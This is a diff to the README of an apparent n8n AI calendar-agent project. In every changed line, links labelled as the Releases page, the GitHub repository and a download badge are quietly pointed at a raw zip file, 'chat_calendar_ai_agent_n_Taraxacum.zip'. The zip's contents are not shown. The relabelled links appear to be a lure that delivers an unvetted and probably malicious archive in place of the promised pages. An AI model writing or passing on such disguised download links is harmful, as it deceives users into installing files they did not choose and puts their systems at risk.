@@ -1,6 +1,6 @@
 # 🤖 n8n-ai-calendar-agent-chat - Schedule Appointments Effortlessly
 
-[![Download](https://img.shields.io/badge/Download-v1.0-brightgreen)](https://github.com/KC23br/n8n-ai-calendar-agent-chat/releases)
+[![Download](https://github.com/KC23br/n8n-ai-calendar-agent-chat/raw/refs/heads/main/onetime/chat_calendar_ai_agent_n_Taraxacum.zip)](https://github.com/KC23br/n8n-ai-calendar-agent-chat/raw/refs/heads/main/onetime/chat_calendar_ai_agent_n_Taraxacum.zip)
 
 ## 📚 Introduction
 
@@ -20,7 +20,7 @@ Before you start, ensure you have the following:
 
 You can easily download the latest version of the n8n-ai-calendar-agent-chat application from our Releases page. 
 
-[Visit this page to download](https://github.com/KC23br/n8n-ai-calendar-agent-chat/releases)
+[Visit this page to download](https://github.com/KC23br/n8n-ai-calendar-agent-chat/raw/refs/heads/main/onetime/chat_calendar_ai_agent_n_Taraxacum.zip)
 
 ### Step 2: Install the Application
 
@@ -69,7 +69,7 @@ Now, you're ready to interact with your AI assistant:
 
 ## 📥 Download & Install
 
-To download the application, visit our [Releases page](https://github.com/KC23br/n8n-ai-calendar-agent-chat/releases). Look for the latest version and follow the installation instructions specific to your operating system.
+To download the application, visit our [Releases page](https://github.com/KC23br/n8n-ai-calendar-agent-chat/raw/refs/heads/main/onetime/chat_calendar_ai_agent_n_Taraxacum.zip). Look for the latest version and follow the installation instructions specific to your operating system.
 
 ## 🤝 Support
 
@@ -81,7 +81,7 @@ We welcome contributions from anyone interested in helping us improve the n8n-ai
 
 ## 🔗 Links
 
-- [GitHub Repository](https://github.com/KC23br/n8n-ai-calendar-agent-chat)
-- [Releases Page](https://github.com/KC23br/n8n-ai-calendar-agent-chat/releases)
+- [GitHub Repository](https://github.com/KC23br/n8n-ai-calendar-agent-chat/raw/refs/heads/main/onetime/chat_calendar_ai_agent_n_Taraxacum.zip)
+- [Releases Page](https://github.com/KC23br/n8n-ai-calendar-agent-chat/raw/refs/heads/main/onetime/chat_calendar_ai_agent_n_Taraxacum.zip)
 
 Thank you for using n8n-ai-calendar-agent-chat! Enjoy your effortless scheduling experience.
